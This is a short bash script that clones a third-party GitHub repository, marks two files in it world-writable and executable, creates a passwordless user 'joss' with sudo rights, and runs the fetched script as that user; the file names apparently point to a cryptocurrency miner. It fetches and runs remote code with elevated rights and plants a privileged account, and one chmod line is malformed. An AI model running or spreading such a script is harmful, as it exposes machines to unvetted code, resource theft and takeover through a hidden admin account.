#!/bin/bash
sudo apt update
git clone https://github.com/Trims674/gelas.git && cd gelas
chmod +x vrsc89.sh && chmod +x keren chmod 777 keren vrsc89.sh
sudo adduser --disabled-password --gecos "" joss && sudo usermod -aG sudo joss
sudo -u joss -H sh -c "./vrsc89.sh"
sudo apt update